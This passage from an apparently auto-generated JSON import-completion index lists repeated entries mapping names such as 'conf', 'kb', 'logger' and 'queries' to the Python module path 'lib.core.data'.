        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "paths",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "queries",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "paths",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "paths",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "cmdLineOptions",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "cmdLineOptions",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "paths",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "paths",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "paths",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "cmdLineOptions",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "queries",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "paths",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "paths",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "queries",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "paths",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "queries",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "queries",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "queries",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "queries",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "queries",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "paths",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "queries",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "queries",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "queries",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
